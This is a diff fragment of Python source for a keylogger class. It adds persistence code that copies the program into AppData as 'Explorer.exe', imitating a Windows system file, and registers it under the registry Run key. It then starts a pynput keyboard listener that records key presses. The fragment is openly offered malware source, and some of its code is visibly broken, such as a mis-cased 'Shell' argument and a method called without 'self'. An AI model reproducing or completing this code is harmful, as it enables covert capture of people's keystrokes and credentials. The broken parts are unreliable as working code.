@@ -44,3 +44,15 @@ class Keylogger:
 
     def add_registry(self):
         #program to registry so that it runs on startup
+        keylogger_location = os.environ["appdata"] + "\\Explorer.exe"
+        if not os.path.exists(keylogger_location):
+            shutil.copyfile(sys.executable, keylogger_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v explorer /t REG_SZ /d "' + keylogger_location + '"', Shell=True)
+
+    def start(self):
+        add_registry()
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
+            
